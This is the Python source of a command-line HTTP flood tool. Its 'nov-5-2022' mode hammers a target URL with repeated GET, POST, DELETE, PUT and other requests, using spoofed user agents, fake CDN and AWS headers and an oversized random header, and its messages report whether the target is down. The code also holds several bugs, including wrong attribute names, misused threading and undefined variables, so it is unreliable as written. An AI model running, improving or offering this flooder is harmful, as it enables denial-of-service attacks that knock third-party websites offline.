#import . . .

from colorama import Fore,Back,init
import requests,random,urllib3,os,threading,platform,ctypes,time
from fake_useragent import FakeUserAgent
from GUI import *
from colorama import Fore,Back,init
from ETC.update.check_update import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def PINGER_REQUEST(url,method):
    req_status = ""
    if "get" in method:
        req_status = requests.get(url)
    if "head" in method:
        req_status = requests.head(url)
    if "option" in method:
        req_status = requests.options(url)
    if "delete" in method:
        req_status = requests.delete(url)
    if "post" in method:
        req_status = requests.post(url)
    if "patch" in method:
        req_status = requests.patch(url)
    if "put" in method:
        req_status = requests.put(url)

    print(f"{Fore.Green}Reply URL-{url} CODE-{req_status.status_code()} METHOD-{method}{Fore.RESET}")

userspoofing = FakeUserAgent(verify_ssl=False)
def nov_5_2022(url,mod,type):
    userspoofing = FakeUserAgent(verify_ssl=False)
    data_range = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    data_range2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    file_website_list = url
    i = file_website_list
    try:
        data_buff =""
        for buffer in range(16):
            data_buff += random.choice((data_range))
                
        data_buff2 =""
        for buffer2 in range(32):
            data_buff2 += random.choice((data_range))
                
        data_buff3 =""
        for buffer3 in range(74):
            data_buff3 += random.choice((data_range2))
        data_buff3 = f"{data_buff3}="

        data_buff4 =""
        for buffer4 in range(24):
            data_buff4 += random.choice((data_range))
                
        data_buff5 =""
        for buffer5 in range(65502):
            data_buff5 += random.choice((data_range2))
                
        i=i.strip()
        if mod == "YES":
            head = {
            "age":f"{random.randint(0,99999999999999999)}",
            "x-amz-server-side-encryption":"AES256,RSA2048,AES2048,RSA4089,AES65502,RSA65502",
            "x-xss-protection": "1; mode=block",
            "x-amz-id-2":f"{buffer3}",
            "x-amz-request-id":f"{data_buff}",
            "etag":f'"{data_buff2}"',
            'User-Agent': f"{userspoofing}",
            "cf-cache-status":f"DYNAMIC",
            "range":"2048 * 4089 * 65502",
            "cf-ray":f"{data_buff4}-USA",
            "Accept-Encoding":f"{buffer5}",
        }
        if mod == "YES2":
            head = {
            "age":f"{random.randint(0,99999999999999999)}",
            "x-amz-server-side-encryption":"AES256,RSA2048,AES2048,RSA4089,AES65502,RSA65502",
            "x-xss-protection": "1; mode=block",
            "x-amz-id-2":f"{buffer3}",
            "x-amz-request-id":f"{data_buff}",
            "etag":f'"{data_buff2}"',
            'User-Agent': f"{userspoofing}",
            "cf-cache-status":f"DYNAMIC",
            "range":"2048 * 4089 * 65502",
            "cf-ray":f"{data_buff4}-USA",
            "Accept-Encoding":f"{buffer5}",
        }
        if mod == "YES3":
            userspoofing = FakeUserAgent(verify_ssl=True)
            head = {
            "age":f"{random.randint(0,99999999999999999)}",
            "x-amz-server-side-encryption":"AES256,RSA2048,AES2048,RSA4089,AES65502,RSA65502",
            "x-xss-protection": "1; mode=block",
            "x-amz-id-2":f"{buffer3}",
            "x-amz-request-id":f"{data_buff}",
            "etag":f'"{data_buff2}"',
            'User-Agent': f"{userspoofing}",
            "cf-cache-status":f"DYNAMIC",
            "range":"2048 * 4089 * 65502",
            "cf-ray":f"{data_buff4}-USA",
            "Accept-Encoding":f"{buffer5}",
        }
        else:
            head = {
            "age":f"{random.randint(0,99999999999999999)}",
            "x-amz-server-side-encryption":"AES256,RSA2048,AES2048,RSA4089,AES65502,RSA65502",
            "x-xss-protection": "1; mode=block",
            "x-amz-id-2":f"{buffer3}",
            "x-amz-request-id":f"{data_buff}",
            "etag":f'"{data_buff2}"',
            "cf-cache-status":f"DYNAMIC",
            "range":"2048 * 4089 * 65502",
            "cf-ray":f"{data_buff4}-USA",
            "Accept-Encoding":f"{buffer5}",
        }
        if type == "all":
            req1=requests.get(i,verify=False,headers=head)
            req2=requests.post(i,verify=False,headers=head)
            req3=requests.head(i,verify=False,headers=head)
            req4=requests.delete(i,verify=False,headers=head)
            req5=requests.options(i,verify=False,headers=head)
            req6=requests.patch(i,verify=False,headers=head)
            req7=requests.put(i,verify=False,headers=head)
            message_flood("get",req1.status_code,i,data_buff)
            message_flood("post",req2.status_code,i,data_buff)
            message_flood("head",req3.status_code,i,data_buff)
            message_flood("delete",req4.status_code,i,data_buff)
            message_flood("option",req5.status_code,i,data_buff)
            message_flood("patch",req6.status_code,i,data_buff)
            message_flood("put",req7.status_code,i,data_buff)
        elif type == "get":
            req=requests.get(i,verify=False,headers=head)
            message_flood("get",req.status_code,i,data_buff)
        elif type == "post":
            req=requests.post(i,verify=False,headers=head)
            message_flood("post",req.status_code,i,data_buff)
        elif type == "normal" or type == "head":
            req=requests.head(i,verify=False,headers=head)
            message_flood("head",req.status_code,i,data_buff)
        elif type == "option":
            req=requests.options(i,verify=False,headers=head)
            message_flood("option",req.status_code,i,data_buff)
        elif type == "delete":
            req=requests.delete(i,verify=False,headers=head)
            message_flood("delete",req.status_code,i,data_buff)
        elif type == "patch":
            req=requests.patch(i,verify=False,headers=head)
            message_flood("patch",req.status_code,i,data_buff)
        elif type == "put":
            req=requests.put(i,verify=False,headers=head)
            message_flood("put",req.status_code,i,data_buff)
        elif type == "random":
            req=""
            string_req = random.choices(("get","post","head","delete","option","patch","put"))
            if "get" in string_req:
                req=requests.get(i,verify=False,headers=head)
                message_flood("get",req.status_code,i,data_buff)
            elif "patch" in string_req:
                req=requests.patch(i,verify=False,headers=head)
                message_flood("patch",req.status_code,i,data_buff)
            elif "put" in string_req:
                req=requests.put(i,verify=False,headers=head)
                message_flood("put",req.status_code,i,data_buff)
            elif "post" in  string_req:
                req=requests.post(i,verify=False,headers=head)
                message_flood("post",req.status_code,i,data_buff)
            elif "head" in string_req:
                req=requests.head(i,verify=False,headers=head)
                message_flood("head",req.status_code,i,data_buff)
            elif "delete" in string_req:
                req=requests.delete(i,verify=False,headers=head)
                message_flood("delete",req.status_code,i,data_buff)
            elif "option" in string_req:
                req=requests.options(i,verify=False,headers=head)
                message_flood("option",req.status_code,i,data_buff)
    except requests.exceptions.RequestException:
            print(f"{Fore.LIGHTRED_EX}{i} CAN'T GET CODE (TARGET DOWN OR ETC) ID-{data_buff} . . .{Fore.RESET}")

def command_attack(command):

    args = command.split(' ')
    if f"{prefix}method" in command:
        if "Windows" in platform.system():
            os.system("cls")
            method()
        else:
            os.system("clear")
            method()

    if f"{prefix}exit" in command:
        if "Windows" in platform.system():
            os.system("cls")
        else:
            os.system("clear")
        print("Exiting . . .")
        exit()

    elif f"{prefix}cls" in command or f"{prefix}clear" in command:
        if "Windows" in platform.system():
            os.system("cls")
        else:
            os.system("clear")
    
    elif f"{prefix}back" in command:
        if "Windows" in platform.system():
            os.system("cls")
        else:
            os.system("clear")
        banner()
    
    elif f"{prefix}prefix_custom" in command:
        prefix_get = input(F"{Fore.BLUE}prefix:{Fore.RESET}")
        pre_import = open("ETC\\prefix.txt",'w')
        pre_import.write(str(prefix_get))
        pre_import.close()
        print(F"{Fore.BLUE}EXITING AND RE-OPEN . .{Fore.RESET}")
        exit()
    
    elif f"{prefix}ping" in command:
        url = args[1]

        method = args[2]

        time_loop = args[3]

        for timer in range(int(time_loop)):
            PINGER_REQUEST(url,method)
        print(f"{Fore.YELLOW}ENDING PING . . .{Fore.RESET}")

    elif f"{prefix}nov-5-2022" in command:
        if "Windows" in platform.system():
            os.system("cls")
        else:
            os.system("clear")
        url = args[1]
        time_loop = args[2]
        mod = args[3]
        type = args[4]
        mod2 = ""
        if mod == "re_user_spf":
            mod2 = "YES"
        elif mod2 == "user_spf":
            mod = "YES2"
        elif mod == "re_ssl_user_spf":
            mod2 == "YES3"
        else:
            mod2 = "NO"
        note_log(url,time_loop,mod,type)
        for timer in range(int(time_loop)):
            thread = threading.Thread(target=nov_5_2022(url,mod2,type))
            thread.start()
        end_log()
